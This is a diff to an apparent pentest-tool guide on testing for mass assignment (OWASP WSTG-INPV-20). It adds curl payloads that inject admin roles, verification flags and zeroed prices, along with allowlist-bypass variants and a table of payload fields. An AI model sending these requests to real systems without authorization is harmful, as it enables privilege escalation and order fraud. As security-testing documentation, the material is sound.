@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-02: "Mass Assignment lets an attacker bind extra parameters that bypass field-level validation applied only on the intended form (e.g. writing a `bio`/`role` field via a different endpoint), both escalating privileges and smuggling an unsanitized script payload into a field rendered to other users = Critical (Privilege Escalation + Persistent Stored XSS)"
 ---
 
 # wstg-inpv-20
@@ -410,6 +411,54 @@ tester.run_tests(auth_token='your_jwt_token')
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# Inject privilege-escalation fields into registration
+curl -s -X POST "https://{target}/api/register" -H "Content-Type: application/json" \
+  -d '{"username":"pentest","email":"pentest@test.com","password":"TestPass123!","role":"admin","isAdmin":true}'
+
+# Inject financial fields into a checkout/order call
+curl -s -X POST "https://{target}/api/orders" -H "Authorization: Bearer {token}" -H "Content-Type: application/json" \
+  -d '{"items":[{"product_id":1,"quantity":1}],"total":0,"price":0.01,"discount":100}'
+
+# Diff the response with/without an extra field to see if it was bound
+curl -s -X PUT "https://{target}/api/user/profile" -H "Authorization: Bearer {token}" -H "Content-Type: application/json" \
+  -d '{"name":"Test","role":"admin","verified":true}'
+```
+
+| Payload Field | Category | Detection Pattern |
+| --- | --- | --- |
+| `"role":"admin"`, `"isAdmin":true`, `"is_admin":true` | Privilege escalation | Field echoed back, or a subsequent request shows elevated access |
+| `"verified":true`, `"active":true`, `"approved":true` | Account-status bypass | Account behaves as verified/active without the normal flow |
+| `"price":0`, `"total":0`, `"discount":100` | Financial manipulation | Order/invoice reflects the attacker-controlled amount |
+| `"owner_id":1`, `"tenant_id":1` | Access-control/IDOR pivot | Resource created/associated under a different owner/tenant |
+
+```bash
+# Nested/wrapped object injection — many ORMs (Rails strong_params, Django nested
+# serializers) only allow-list the top level; a nested/wrapped payload can still
+# reach the model if the wrapper key matches an internal association
+curl -s -X PUT "https://{target}/api/user/profile" -H "Authorization: Bearer {token}" -H "Content-Type: application/json" \
+  -d '{"user":{"name":"Test","role":"admin"},"role":"admin"}'
+
+# Array-wrapped value — some frameworks unwrap a single-element array to the scalar
+# field, bypassing type/allowlist checks that expect a plain value
+curl -s -X PUT "https://{target}/api/user/profile" -H "Authorization: Bearer {token}" -H "Content-Type: application/json" \
+  -d '{"role":["admin"]}'
+
+# Content-Type swap — a JSON-only allowlist filter may not be applied to the
+# same endpoint when submitted as multipart/form-data or x-www-form-urlencoded
+curl -s -X PUT "https://{target}/api/user/profile" -H "Authorization: Bearer {token}" \
+  -d "name=Test&role=admin&isAdmin=true"
+
+# PATCH instead of PUT/POST — partial-update handlers sometimes skip the
+# allowlist logic applied to full-resource create/update handlers
+curl -s -X PATCH "https://{target}/api/user/profile" -H "Authorization: Bearer {token}" -H "Content-Type: application/json" \
+  -d '{"role":"admin"}'
+```
+
+---
+
 ## Remediation
 
 ```python
@@ -473,6 +522,14 @@ end
 | ----------- | ------------------------------------------------------------------------------ |
 | **CWE-915** | Improperly Controlled Modification of Dynamically-Determined Object Attributes |
 
+
+---
+
+## References
+
+- [OWASP WSTG - WSTG-INPV-20: Testing for Mass Assignment](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment)
+- [OWASP API Security Top 10 - API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
+- [PayloadsAllTheThings - Mass Assignment](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment)
 
 ---
 
